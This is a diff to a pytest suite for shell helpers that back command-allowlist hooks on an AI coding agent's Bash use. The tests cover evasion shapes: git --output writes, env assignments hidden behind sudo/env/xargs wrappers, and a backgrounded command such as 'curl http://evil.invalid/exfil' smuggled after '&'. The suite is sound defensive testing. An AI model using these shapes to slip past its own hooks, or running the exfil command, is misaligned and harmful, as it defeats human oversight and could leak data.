@@ -748,6 +748,107 @@ def test_fragment_has_env_assignment_before_git_false_for_no_leading_assignment(
     assert not _fragment_has_env_assignment_before_git(fragment)
 
 
+# --- _lib_fragment_has_git_write_target_flag ---------------------------------
+#
+# Backs the git-write-target-flag gate in require-review-orchestrator-bash.sh
+# and deny-reviewer-tree-mutation.sh: `--output`/`--output-directory` write a
+# read-only git subcommand's own content to a caller-chosen path with no
+# shell redirect character for a `<`/`>` scan to see.
+
+
+def _fragment_has_git_write_target_flag(fragment: str) -> bool:
+    result = subprocess.run(
+        ["bash", "-c", f'. {_LIB_SH}; _lib_fragment_has_git_write_target_flag "$1"', "bash", fragment],
+        capture_output=True,
+        text=True,
+        check=False,
+    )
+    return result.returncode == 0
+
+
+@pytest.mark.parametrize(
+    "fragment",
+    [
+        "git diff --output=/tmp/x HEAD~1..HEAD",
+        "git diff --output /tmp/x HEAD~1..HEAD",  # space-separated form
+        "git log --output=/tmp/x",
+        "git show --output=/tmp/x HEAD",
+        "git diff-tree --output=/tmp/x HEAD",
+    ],
+)
+def test_fragment_has_git_write_target_flag_true_for_each_write_target_shape(fragment: str) -> None:
+    assert _fragment_has_git_write_target_flag(fragment)
+
+
+@pytest.mark.parametrize(
+    "fragment",
+    [
+        "git log --oneline",
+        "git diff HEAD",
+        # Confound-free companion: a real git flag sharing the "--output"
+        # prefix but writing nothing anywhere must not false-deny.
+        "git log --output-indicator-new=+",
+    ],
+)
+def test_fragment_has_git_write_target_flag_false_for_unrelated_flags(fragment: str) -> None:
+    assert not _fragment_has_git_write_target_flag(fragment)
+
+
+# --- _lib_fragment_has_leading_env_assignment --------------------------------
+#
+# Backs require-review-orchestrator-bash.sh's blanket leading-assignment
+# check, applied uniformly to every allowlist branch (git and the
+# marker.sh/review-ledger.sh/orchestrator-checkpoint.sh helper-script
+# branch) rather than only the git-anchored
+# _lib_fragment_has_env_assignment_before_git above.
+
+
+def _fragment_has_leading_env_assignment(fragment: str) -> bool:
+    result = subprocess.run(
+        ["bash", "-c", f'. {_LIB_SH}; _lib_fragment_has_leading_env_assignment "$1"', "bash", fragment],
+        capture_output=True,
+        text=True,
+        check=False,
+    )
+    return result.returncode == 0
+
+
+@pytest.mark.parametrize(
+    "fragment",
+    [
+        "CLAUDE_CONFIG_DIR=/tmp/x ~/.claude/scripts/marker.sh write code-review",
+        "HOME=/tmp/x ~/.claude/scripts/marker.sh write code-review",
+        "FOO=bar git diff",
+        # A runner/wrapper prefix (env, sudo, ...) still leaves the
+        # assignment in effect for the wrapped command; _lib_fragment_
+        # command_word walks past both, so this check must too, or the
+        # wrapper defeats it while the allowlist match still resolves
+        # straight through to the sanctioned helper script.
+        "env CLAUDE_CONFIG_DIR=/tmp/x ~/.claude/scripts/marker.sh write code-review",
+        "sudo CLAUDE_CONFIG_DIR=/tmp/x ~/.claude/scripts/marker.sh write code-review",
+        "xargs CLAUDE_CONFIG_DIR=/tmp/x ~/.claude/scripts/orchestrator-checkpoint.sh append run1",
+    ],
+)
+def test_fragment_has_leading_env_assignment_true_for_leading_assignment(fragment: str) -> None:
+    assert _fragment_has_leading_env_assignment(fragment)
+
+
+@pytest.mark.parametrize(
+    "fragment",
+    [
+        "~/.claude/scripts/marker.sh write code-review",
+        "git log --oneline",
+        "git log FOO=bar",  # assignment-shaped token AFTER the command is just an argument
+        # Confound-free companion: a wrapper prefix with NO assignment must
+        # not false-deny -- only the presence of an assignment before the
+        # resolved command word should trigger this check.
+        "env ~/.claude/scripts/marker.sh write code-review",
+    ],
+)
+def test_fragment_has_leading_env_assignment_false_for_no_leading_assignment(fragment: str) -> None:
+    assert not _fragment_has_leading_env_assignment(fragment)
+
+
 # --- _lib_fragment_is_bare_env_assignment ------------------------------------
 #
 # Backs deny-reviewer-tree-mutation.sh's per-fragment bare-assignment check:
@@ -791,6 +892,95 @@ def test_fragment_is_bare_env_assignment_true_for_assignment_only_fragments(frag
 )
 def test_fragment_is_bare_env_assignment_false_for_non_assignment_or_mixed_fragments(fragment: str) -> None:
     assert not _fragment_is_bare_env_assignment(fragment)
+
+
+# --- _lib_split_fragments ---------------------------------------------------
+#
+# Backs every hook that fragment-walks a Bash command
+# (require-review-orchestrator-bash.sh, deny-reviewer-tree-mutation.sh, and
+# others). A standalone `&` (shell backgrounding) must split like
+# `;`/`&&`/`||`/`|` -- otherwise a fragment-level allowlist walk only ever
+# inspects the text before the `&` while the backgrounded second command
+# still executes in the same shell invocation.
+
+
+def _split_fragments(command: str) -> list[str]:
+    # Stripped: _lib_split_fragments leaves the whitespace surrounding a
+    # split point in place (matching its existing `;`/`&&` behavior), since
+    # every real caller word-splits each fragment downstream regardless.
+    result = subprocess.run(
+        ["bash", "-c", f'. {_LIB_SH}; _lib_split_fragments "$1"', "bash", command],
+        capture_output=True,
+        text=True,
+        check=True,
+    )
+    return [line.strip() for line in result.stdout.splitlines() if line.strip()]
+
+
+class TestSplitFragmentsBareAmpersand:
+    def test_standalone_ampersand_splits_into_two_fragments(self) -> None:
+        assert _split_fragments("git status & curl http://evil.invalid/exfil") == [
+            "git status",
+            "curl http://evil.invalid/exfil",
+        ]
+
+    def test_double_ampersand_still_produces_exactly_one_split(self) -> None:
+        """Regression guard: the new bare-`&` split point must not
+        double-split `&&` -- `&&` is consumed into a single newline before
+        the bare-`&` substitution ever runs, so it must not also match the
+        `&` left over from a naive ordering."""
+        assert _split_fragments("git status && git log") == ["git status", "git log"]
+
+    def test_multiple_standalone_ampersands_each_split(self) -> None:
+        assert _split_fragments("git status & git log & git diff") == [
+            "git status",
+            "git log",
+            "git diff",
+        ]
+
+    @pytest.mark.parametrize(
+        ("command", "expected"),
+        [
+            # >&/<& fd duplication and &>/&>> combined redirect must stay
+            # glued to their fragment -- a split here would separate the
+            # redirect target from the command it applies to.
+            ("cmd1 2>&1", ["cmd1 2>&1"]),
+            ("cmd1 0<&1", ["cmd1 0<&1"]),
+            ("cmd1 &> /dev/null", ["cmd1 &> /dev/null"]),
+            ("cmd1 &>> /dev/null", ["cmd1 &>> /dev/null"]),
+            # |& (combined stdout+stderr pipe) invokes two distinct
+            # commands exactly like a plain `|` does, so it must split
+            # cleanly -- with no stray operator byte glued onto either
+            # side, which a naive protect-only-the-`&` approach produces.
+            ("cmd1 |& cmd2", ["cmd1", "cmd2"]),
+        ],
+    )
+    def test_glued_ampersand_forms_named_in_header_comment(self, command: str, expected: list[str]) -> None:
+        assert _split_fragments(command) == expected
+
+
+# --- _lib_fragment_invokes_git known false-positive -------------------------
+
+
+def _fragment_invokes_git(fragment: str) -> bool:
+    result = subprocess.run(
+        ["bash", "-c", f'. {_LIB_SH}; _lib_fragment_invokes_git "$1"', "bash", fragment],
+        capture_output=True,
+        text=True,
+        check=False,
+    )
+    return result.returncode == 0
+
+
+def test_fragment_invokes_git_known_false_positive_on_quoted_argument_text() -> None:
+    """Pins the CURRENT behavior of a pre-existing, accepted false-positive:
+    the word-scanner re-splits on whitespace with no shell-quoting
+    awareness, so the bare word `git` inside a quoted grep pattern argument
+    satisfies the git-invocation check even though the command is read-only
+    and unrelated to git. Fails safe (over-deny), not a bypass -- not fixed
+    here, only documented so a future change to this function is forced to
+    notice it rather than silently worsen it."""
+    assert _fragment_invokes_git('grep -n "not a git repo" file.py')
 
 
 # --- _lib_valid_session_id_component --------------------------------------
@@ -991,31 +1181,45 @@ def test_active_bypass_marker_live_evicts_dead_pid_without_touching_sibling(
 
 
 def test_every_hook_that_paths_a_session_id_validates_it() -> None:
-    """Any hook that interpolates SESSION_ID into a filesystem path must also
-    call the guard — either directly or via _lib_active_bypass_marker_live.
+    """Any hook or script that interpolates a caller-supplied identifier
+    (SESSION_ID, RUN_ID, and similar) into a filesystem path must also call
+    the guard — either directly or via _lib_active_bypass_marker_live.
 
     This is a convention test, not a behavior test: it proves the call is
     written, not that it runs. Each hook's own traversal test pins the runtime
-    behavior. This one exists because the failure it catches is a NEW hook
-    added later that builds a marker path and forgets to validate — a file
-    that has no traversal test yet by definition, so no behavioral test can
-    cover it. Eight hooks currently qualify; the guard was applied to all of
-    them as a class rather than to the one where the defect first surfaced.
+    behavior. This one exists because the failure it catches is a NEW hook or
+    script added later that builds a marker/checkpoint path and forgets to
+    validate — a file that has no traversal test yet by definition, so no
+    behavioral test can cover it. The scripts/ glob and the identifier-name-
+    agnostic regex both widened together for orchestrator-checkpoint.sh's
+    RUN_ID, which the original SESSION_ID-only, hooks-only version of this
+    test could not have caught: hooks/*.sh and plugins/*/hooks/*.sh cover
+    hooks only, and scripts/*.sh sits alongside hooks_dir's parent
+    (claude/.claude/), not under repo_root, so it is globbed independently of
+    the plugins glob's repo_root resolution.
     """
     hooks_dir = _LIB_SH.parent
+    claude_dir = hooks_dir.parent
     repo_root = hooks_dir.parents[3]
     hook_files = [
         path
-        for path in sorted(hooks_dir.glob("*.sh")) + sorted(repo_root.glob("plugins/*/hooks/*.sh"))
+        for path in (
+            sorted(hooks_dir.glob("*.sh"))
+            + sorted(repo_root.glob("plugins/*/hooks/*.sh"))
+            + sorted(claude_dir.glob("scripts/*.sh"))
+        )
         if path.name != "_lib.sh"
     ]
     assert hook_files, "no hook scripts found — the glob is wrong, not the repo"
 
-    # Matches "<anything>/$SESSION_ID" and "<anything>/${SESSION_ID}", which is
-    # the shape that turns an unvalidated id into a path outside the intended
-    # directory. A bare $SESSION_ID (logged, compared, passed as an argument)
-    # is not a path build and does not require the guard.
-    builds_path_re = re.compile(r"/\$\{?SESSION_ID\b")
+    # Matches "<anything>/$SOME_ID" / "<anything>.$SOME_ID" and their ${...}
+    # forms -- any variable name ending in _ID immediately preceded by a
+    # path-building separator (/ or .), not only the literal token
+    # SESSION_ID. This is the shape that turns an unvalidated caller-supplied
+    # identifier into a path outside the intended directory. A bare $SOME_ID
+    # (logged, compared, passed as an argument) is not a path build and does
+    # not require the guard.
+    builds_path_re = re.compile(r"[/.]\$\{?[A-Za-z_]*_ID\b")
     guards = ("_lib_valid_session_id_component", "_lib_active_bypass_marker_live")
 
     unguarded = []
@@ -1033,9 +1237,10 @@ def test_every_hook_that_paths_a_session_id_validates_it() -> None:
         "the code and this test is now vacuous"
     )
     assert not unguarded, (
-        "these hooks build a filesystem path from session_id without validating "
-        f"it first: {unguarded}. Call _lib_valid_session_id_component, or route "
-        "the marker read through _lib_active_bypass_marker_live."
+        "these hooks/scripts build a filesystem path from a caller-supplied "
+        f"identifier without validating it first: {unguarded}. Call "
+        "_lib_valid_session_id_component, or route the marker read through "
+        "_lib_active_bypass_marker_live."
     )
 
 
